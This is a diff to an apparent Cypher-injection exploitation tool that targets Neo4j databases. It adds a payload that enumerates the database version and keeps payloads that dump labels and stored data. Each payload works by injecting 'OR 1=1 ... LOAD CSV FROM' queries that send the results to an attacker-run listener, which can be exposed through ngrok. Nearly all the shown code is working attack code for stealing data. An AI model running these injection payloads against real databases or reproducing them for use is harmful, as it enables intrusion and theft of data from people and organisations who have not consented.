@@ -23,7 +23,9 @@ def get_ip_address(network_interface):
     return ni.ifaddresses(network_interface)[ni.AF_INET][0]['addr']
 
 def extract_query_params(query_string):
-    """Extract query parameters from a query string."""
+    """
+    Extracts param=value into json format
+    """
     pattern = re.compile(r'([^&=?]+)=([^&=?]+)')
     matches = pattern.findall(query_string)
     return {key: value for key, value in matches}
@@ -182,8 +184,19 @@ class Neo4jInjector:
 
     def exfil_data(self):
 
+        print("Enumerating Version")
+        self.inject_payload(f" OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT name,version,edition LOAD CSV FROM '{self.exfil_ip}/?version=' + version + '&name=' + replace(name,' ','') + '&edition=' + edition as l RETURN 0 as _0//")
+
+        data = data_queue.get()  # Retrieve the next item from the queue
+        parsed_data = extract_query_params(data)  # Use the previously defined function
+        nested_dict = {'-': parsed_data}
+        json_result = json.dumps(nested_dict)
+        write_json_to_file(json_result, "version.json")
+        json_to_table(json_result)
+
+
         print("Dumping labels count")
-        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH COUNT(DISTINCT label) as l LOAD CSV FROM '{self.exfil_ip}/?label_count='+l as x RETURN 0 as _0 // ")
+        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH COUNT(DISTINCT label) as l LOAD CSV FROM '{self.exfil_ip}/?label_count='+l as x RETURN 0 as _0 //")
 
         data = data_queue.get()  # Retrieve the next item from the queue
         parsed_data = extract_query_params(data)  # Use the previously defined function
@@ -194,7 +207,7 @@ class Neo4jInjector:
 
         # Store labels
         labels = []
-        for i in range(int(label_count)):
+        for _ in range(int(label_count)):
             data = data_queue.get()  # Retrieve the next item from the queue
             parsed_data = extract_query_params(data)  # Use the previously defined function
             label_value = parsed_data.get('label', None)  # Extract the label value
@@ -220,7 +233,7 @@ class Neo4jInjector:
         values = [] 
         while not data_queue.empty():
             pair = []
-            for _ in range(int(value_count)):  # Get 2 items
+            for _ in range(int(value_count)):
                 if not data_queue.empty():
                     data = data_queue.get()
                     parsed_data = extract_query_params(data)
@@ -230,8 +243,9 @@ class Neo4jInjector:
                     break
             values.append(pair)
 
+        
         json_result = convert_to_json(values)
-        write_json_to_file(json_result)
+        write_json_to_file(json_result, "data.json")
         json_to_table(json_result)
 
         
@@ -245,6 +259,10 @@ def main():
     parser.add_argument("--listen-port", type=int, default=80, help="Listener port")
     args = parser.parse_args()
 
+    listener = Listener(args.listen_port)
+    listener_thread = threading.Thread(target=listener.start_listener, daemon=True)
+    listener_thread.start() 
+
     if args.int == "public":
         ngrok_auth_token = os.getenv("NGROK_AUTHTOKEN")
         if ngrok_auth_token:
@@ -256,20 +274,14 @@ def main():
         url = start_ngrok.public_url.replace("tcp://", "http://")
         hostname, port = url.split("://")[1].split(":")
         args.exfil_ip = f"http://{hostname}"
-        old_port = args.listen_port
         args.listen_port = int(port)
         
         print(f"External IP: {args.exfil_ip}, External Port: {args.listen_port}")
-
     elif args.int:
         args.exfil_ip = f"http://{get_ip_address(args.int)}"
     else:
         args.exfil_ip = "127.0.0.1"
 
-
-    listener = Listener(old_port)
-    listener_thread = threading.Thread(target=listener.start_listener, daemon=True)
-    listener_thread.start() 
 
     injector = Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie)
 
